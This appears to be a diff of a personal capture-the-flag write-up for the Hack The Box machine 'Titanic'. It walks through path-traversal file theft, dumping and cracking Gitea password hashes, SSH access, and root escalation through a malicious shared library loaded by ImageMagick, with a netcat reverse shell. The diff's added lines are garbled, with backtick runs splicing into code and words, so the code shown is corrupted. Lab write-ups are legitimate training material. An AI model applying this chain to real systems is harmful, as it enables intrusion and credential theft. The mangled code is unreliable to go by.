@@ -2,7 +2,7 @@
 - 
 ## Nmap Enumeration
 - We pass the commands:
-	```bash
+	```
 nmap -sV -sC -vv 10.10.11.55
 nmap -sU --top-ports=10 -vv 10.10.11.55
 
@@ -28,22 +28,19 @@ n/a
 ## Directory Enumeration
 - Gobuster:
 	- Directory
-		```bash
+		```
 gobuster dir -u http://titanic.htb dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root
 ```
 		- Next Directory
-			```bash
-
-```
+			````
 	- VHost
 		```bash
 
-```
-- Ffuf
+`````f
 	```bash
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://titanic.htb/ -H 'Host: FUZZ.titanic.htb' -fw 20
 
----OUTPUT---
+-```T---
 dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 46ms]
 :: Progress: [100000/100000] :: Job [1/1] :: 1234 req/sec :: Duration: [0:01:36] :: Errors: 0 ::
 ```
@@ -51,7 +48,7 @@ dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Dura
 	```bash
 
 ```
-- Dirbuster
+-```ter
 	- 
 
 ## Website Enumeration
@@ -64,7 +61,7 @@ dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Dura
 			```bash
 |`version: '3.8'`|
 |`services:`|
-|`mysql:`|
+|`m```
 |`image: mysql:8.0`|
 |`container_name: mysql`|
 |`ports:`|
@@ -80,7 +77,7 @@ dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Dura
 			```bash
 `{"name": "Rose DeWitt Bukater", "email": "rose.bukater@titanic.htb", "phone": "643-999-021", "date": "2024-08-22", "cabin": "Suite"}`
 
-`{"name": "Jack Dawson", "email": "jack.dawson@titanic.htb", "phone": "555-123-4567", "date": "2024-08-23", "cabin": "Standard"}`
+`{"```"Jack Dawson", "email": "jack.dawson@titanic.htb", "phone": "555-123-4567", "date": "2024-08-23", "cabin": "Standard"}`
 ```
 	- app.py talks about how it's making the json file.
 		- maybe we can poison it
@@ -88,7 +85,7 @@ dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Dura
 		```bash
 |`version: '3'`|
 |`services:`|
-|`gitea:`|
+|````|
 |`image: gitea/gitea`|
 |`container_name: gitea`|
 |`ports:`|
@@ -103,7 +100,7 @@ dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Dura
 ```
 		- Seems to be the dev login 
 	- Can create account and login to find more users:
-		![[Pasted image 20250425115131.png]]
+		![Pasted image 20250425115131.png](../Attachments/Pasted%20image%2020250425115131.png)
 	
 ### Direct
 - 
@@ -111,25 +108,25 @@ dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Dura
 ### Via BurpSuite
 - With burp i tried to see what was going on with the json file and found that We do a GET request to download a ticket.
 	- If we replace the file with a path (for linux /etc/passwd) we get a hit:
-	- ![[Pasted image 20250425124741.png]]
+	- ![Pasted image 20250425124741.png](../Attachments/Pasted%20image%2020250425124741.png)
 - https://docs.gitea.com/next/administration/config-cheat-sheet
 	- Any changes to the Gitea configuration file should be made in `custom/conf/app.ini` or any corresponding location. When installing from a distribution, this will typically be found at `/etc/gitea/conf/app.ini`.
 - So we try to access `/gitea/conf/app.ini`
-	- ![[Pasted image 20250425150724.png]]
+	- ![Pasted image 20250425150724.png](../Attachments/Pasted%20image%2020250425150724.png)
 		- We see there is a database in `/data/gitea/gitea.db`
 - We check for the DB:
-	- ![[Pasted image 20250425150918.png]]
+	- ![Pasted image 20250425150918.png](../Attachments/Pasted%20image%2020250425150918.png)
 		- We see a DL and it says SQLite format
 - We download this file via the url: http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/gitea/gitea.db
 - We use SQLite on it.
 	```bash
 sqlite3 _.._.._.._.._.._home_developer_gitea_data_gitea_gitea.db .tables
 ```
-	- Gives us a lot of tables. We see one that says user:
+	``` us a lot of tables. We see one that says user:
 	```bash
 sqlite3 -cmd ".headers on" -cmd ".mode column" _.._.._.._.._.._home_developer_gitea_data_gitea_gitea.db "SELECT * FROM user;"
 
----OUTPUT---
+-```T---
 id  lower_name     name           full_name  email                  keep_email_private  email_notifications_preference  passwd                                                        passwd_hash_algo  must_change_password  login_type  login_source  login_name  type  location  website  rands                             salt                              language  description  created_unix  updated_unix  last_login_unix  last_repo_visibility  max_repo_creation  is_active  is_admin  is_restricted  allow_git_hook  allow_import_local  allow_create_organization  prohibit_login  avatar                            avatar_email           use_custom_avatar  num_followers  num_following  num_stars  num_repos  num_teams  num_members  visibility  repo_admin_change_team_access  diff_view_style  theme       keep_activity_private
 --  -------------  -------------  ---------  ---------------------  ------------------  ------------------------------  ------------------------------------------------------------  ----------------  --------------------  ----------  ------------  ----------  ----  --------  -------  --------------------------------  --------------------------------  --------  -----------  ------------  ------------  ---------------  --------------------  -----------------  ---------  --------  -------------  --------------  ------------------  -------------------------  --------------  --------------------------------  ---------------------  -----------------  -------------  -------------  ---------  ---------  ---------  -----------  ----------  -----------------------------  ---------------  ----------  ---------------------
 1   administrator  administrator             root@titanic.htb       0                   enabled                         cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d4  pbkdf2$50000$50   0                     0           0                         0                        70a5bd0c1a5d23caa49030172cdcabdc  2d149e5fbd1b20cf31db3e3c6a28fc9b  en-US                  1722595379    1722597477    1722597477       0                     -1                 1          1         0              0               0                   1                          0               2e1e70639ac6b0eecbdab4a3d19e0f44  root@titanic.htb       0                  0              0              0          0          0          0            0           0                                               gitea-auto  0                    
@@ -144,7 +141,7 @@ id  lower_name     name           full_name  email                  keep_email_p
 	```bash
 sqlite3 _.._.._.._.._.._home_developer_gitea_data_gitea_gitea.db "select email,salt,passwd from user"
 
----OUTPUT---
+-```T---
 root@titanic.htb|2d149e5fbd1b20cf31db3e3c6a28fc9b|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136
 developer@titanic.htb|8bf3e3452b78544f8bee9400d6936d34|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56
 test@example.com|e12f9153749a76b86b697835b1980a5f|d07bd0a7bb0505e3a0fd0908d7f63ad11cd123b02c6ead8f98ed9f01303c5fc89d9a9453e3cb8d684c4002fff439e34abf8f
@@ -154,7 +151,7 @@ test@example.com|e12f9153749a76b86b697835b1980a5f|d07bd0a7bb0505e3a0fd0908d7f63a
 	```bash
 import sqlite3
 import base64
-import sys
+i```ys
 
 if len(sys.argv) != 2:
     print("Usage: python3 gitea3hashcat.py <gitea.db>")
@@ -184,7 +181,7 @@ except Exception as e:
 	```bash
 python3 gitea2hashcat.py _.._.._.._.._.._home_developer_gitea_data_gitea_gitea.db         
 
----OUTPUT---
+-```T---
 administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
 developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
 test:sha256:50000:4S+RU3SadrhraXg1sZgKXw==:0HvQp7sFBeOg/QkI1/Y60RzRI7Asbq2PmO2fATA8X8idmpRT48uNaExAAv/0OeNKv48=
@@ -194,7 +191,7 @@ test:sha256:50000:4S+RU3SadrhraXg1sZgKXw==:0HvQp7sFBeOg/QkI1/Y60RzRI7Asbq2PmO2fA
 	```bash
 hashcat -m 10900 gitea.hashes /usr/share/wordlists/rockyou.txt
 
----OUTPUT---
+-```T---
 sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:2528252
 ```
 	- We see we get a hit for developer.
@@ -202,7 +199,7 @@ sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfL
 	```bash
 ssh developer@titanic.htb
 ```
-	- We gain access and grab the user flag
+	```in access and grab the user flag
 ## Privilege Escalation
 - Initial enumeration doesn't give much
 	- we can't pass sudo commands
@@ -213,7 +210,7 @@ ssh developer@titanic.htb
 developer@titanic:/opt/scripts$ cat identify_images.sh                           
 
 
----OUTPUT---
+-```T---
 cd /opt/app/static/assets/images                                                                       
 truncate -s 0 metadata.log                                                                             
 find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
@@ -223,7 +220,7 @@ find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magic
 	```bash
 developer@titanic:/opt/scripts$ magick --version
 Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
-Copyright: (C) 1999 ImageMagick Studio LLC
+C```t: (C) 1999 ImageMagick Studio LLC
 License: https://imagemagick.org/script/license.php
 Features: Cipher DPC HDRI OpenMP(4.5) 
 Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
@@ -235,7 +232,7 @@ Compiler: gcc (9.4
 				```bash
 gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
 #include <stdio.h>
-#include <stdlib.h>
+#inc```tdlib.h>
 #include <unistd.h>
 __attribute__((constructor)) void init(){
     system("id");
@@ -249,7 +246,7 @@ EOF
 			```bash
 cd 
 vi exploit.c
-cat exploit.c
+cat```t.c
 ---OUTPUT---
 #include <stdio.h>
 #include <sys/types.h>
@@ -264,11 +261,11 @@ __attribute__((constructor)) void init(){
 			```bash
 gcc exploit.c -shared -fPIC -o ./libxcb.so.1
 ```
-	- We turn on netcat listener:
+	- ``` on netcat listener:
 		```bash
 nc -lvnp 9999
 
----OUTPUT---
+--```---
 nc -lvnp 9999
 listening on [any] 9999 ...
 connect to [10.10.14.25] from (UNKNOWN) [10.10.11.55] 37726
@@ -286,7 +283,7 @@ root@titanic:/opt/app/static/assets/images#
 	```bash
 
 #include <stdio.h>
-#include <sys/types.h>
+#``` <sys/types.h>
 #include <stdlib.h>
 #include <unistd.h>
 
@@ -302,6 +299,6 @@ void _init() {
 		```bash
 sudo cat /root/root.txt
 ```
-- Technically we can pass any command here to get the root flag. 
+- ```ally we can pass any command here to get the root flag. 
 -------
 --------
